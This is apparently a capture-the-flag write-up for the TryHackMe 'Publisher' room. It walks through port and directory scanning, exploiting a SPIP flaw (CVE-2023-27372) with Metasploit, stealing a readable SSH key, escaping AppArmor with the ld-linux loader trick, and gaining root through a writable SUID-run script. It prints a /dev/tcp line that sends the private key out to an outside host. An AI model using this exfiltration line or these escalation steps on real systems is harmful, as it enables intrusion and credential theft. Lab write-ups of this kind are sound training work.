[Publisher](https://tryhackme.com/room/publisher)
## Nmap scan
Start with a default nmap scan:
```bash
nmap -sVC -vv -p- -T4 <IP> -oN nmap-full
```
The scan result suggests a http web server at port 80 with Apache 2.4.41 named Pubisher's Pulse, a community blog site:
![Pasted image 20260305102641](../Images/Pasted%20image%2020260305102641.png)
## Inspecting the webpage
The main page showing two blogs, one of them is posted by a user named Admin:
![Pasted image 20260305102946](../Images/Pasted%20image%2020260305102946.png)
By inspecting the page source and also try navigating around, I see that every other link just do navigate to `/#`, which is useless for now.
## Directory enumeration
So for now the given homepage doesn't give me much of a useful information, so I try ffuf to find for other directories: 
```bash
ffuf -u http://10.48.133.112:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -mc 200-403 -recursion -v > ffuf-dir
```
which then leads to two directories named images and spip:
![Pasted image 20260305110524](../Images/Pasted%20image%2020260305110524.png)
![Pasted image 20260305115926](../Images/Pasted%20image%2020260305115926.png)
The /ecrire directory leads to a spip login page:
![Pasted image 20260305120011](../Images/Pasted%20image%2020260305120011.png)
By inspecting the source of the page I was able to identify the version of current spip instance:
![](../Images/Pasted%20image%2020260424213443.png)
## CVE-2023-27372
Alternatively, we can use Metasploit:
![](../Images/Pasted%20image%2020260424214521.png)
Options needed to be changed including RHOSTS, TARGETURI, LHOST
![](../Images/Pasted%20image%2020260424214627.png)
The user flag is in `/home/think/user.txt`.
Checking the id, currently I'm www-data. But somehow I got access to think user's directory.
![](../Images/Pasted%20image%2020260424215204.png)
So currently the id_rsa of `think` user has world readable permission, so I can get the private key to ssh to the machine as think.
Since both netcat and python3 not installed, I have found out a new way to transfer files:
```bash
cat id_rsa > /dev/tcp/IP/PORT
```
![](../Images/Pasted%20image%2020260424215638.png)
And we successfully upgraded our shell to a more stable ssh connection.
Searching for SUID binaries:
![](../Images/Pasted%20image%2020260424225232.png)
Try running `/usr/sbin/run_container`:
![](../Images/Pasted%20image%2020260424225358.png)
Seems like it executes an `sh` file `/opt/run_container.sh`.
![](../Images/Pasted%20image%2020260424230608.png)
As it listed here, we have write access to this bash script. Since the run_container binary is invoking this, we can modify it to execute arbitrary shell commands.
![](../Images/Pasted%20image%2020260424230724.png)
Funny, it is listed that I have write permission but I can't actually modify it.
![](../Images/Pasted%20image%2020260424231719.png)
So the shell the user think is using is ash.
Checking the `apparmor.d` directory I see a `usr.sbin.ash` profile, which might be the one restricting our permission.
![](../Images/Pasted%20image%2020260424231922.png)
Yes so it's restricted all write permissions to anything under `/opt/`.
![](../Images/Pasted%20image%2020260425001457.png)
So after a research, I've found the script that we can bypass and start a bash shell to escape from apparmor's confinement:
```bash
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```
![](../Images/Pasted%20image%2020260425105130.png)
Since the apparmor rules are limited to inside the ash shell, leaving it gives us back the normal privilege on `/opt/` directories.
As you can see I was able to inject the script to spawn a privileged shell into `run_container.sh`.
![](../Images/Pasted%20image%2020260425105326.png)
And we were able to get the root shell.
